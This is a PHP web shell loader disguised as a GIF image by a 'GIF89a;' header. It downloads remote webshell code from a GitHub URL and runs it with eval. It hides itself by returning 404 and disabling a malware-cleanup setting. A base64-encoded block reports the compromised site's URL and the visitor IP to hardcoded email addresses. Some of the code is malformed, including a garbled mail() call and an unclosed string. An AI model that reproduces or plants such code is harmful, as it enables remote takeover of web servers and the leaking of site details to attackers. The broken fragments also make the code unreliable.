GIF89a;

<?php
$head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<meta name="robots" content="noindex">
<style>pre{border:1px solid #ddd;padding:10px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:10px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}</style>
$shell_data="JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07CmlmICgkdmlzaXRjb3VudCA9PSAiIikgewogICAgJHZpc2l0Y291bnQgPSAwOwogICAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsKICAgICR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07CiAgICAkaW5qID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07CiAgICAkdGFyZ2V0ID0gcmF3dXJsZGVjb2RlKCR3ZWIgLiAkaW5qKTsKICAgICRib2R5ID0gIkxpbmsgSW5qZWsgUEhQIHNoZWxsIDogIHskdGFyZ2V0fSB8IE1ENSBwYXNzID0geyRhdXRoX3Bhc3N9IHwgSVAgYWtzZXMgPSB7JHZpc2l0b3J9IjsKICAgIEBtYWlsKCJtdWhyYXpreUBnbWFpbC5jb20iLCAic2hlTEwiLCAieyRib2R5fSIpOwp9IGVsc2UgewogICAgJHZpc2l0Y291bnQ7Cn0Kc2V0Y29va2llKCJ2aXNpdHMiLCAkdmlzaXRjb3VudCk7CiRzYWZlX21vZGUgPSBAaW5pX2dldCgnc2FmZV9tb2RlJyk7CmlmICghJHNhZmVfbW9kZSkgewogICAgZXJyb3JfcmVwb3J0aW5nKDApOw=="; eval(base64_decode($shell_data));
</head>';
$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/template.php";
$ch = curl_init($url); 
error_reporting(0);
ini_set('lsapi_backend_off', '1');
ini_set("imunify360.cleanup_on_restore", false);
http_response_code(404);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
eval("?>".$result);
$e=base64_decode("YmxhY2toYXQxMzM3LmlkQGdtYWlsLmNvbQ==");
$h=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
header('Content-Type: text/html; charset=UTF-8');
$to = "muhrazky@gmail.com";
$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($shell_data,to,e, "Halo senpai!!!", $message,$shell_data,$shell, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
<?php
$random = rand(1000,5000);
?>
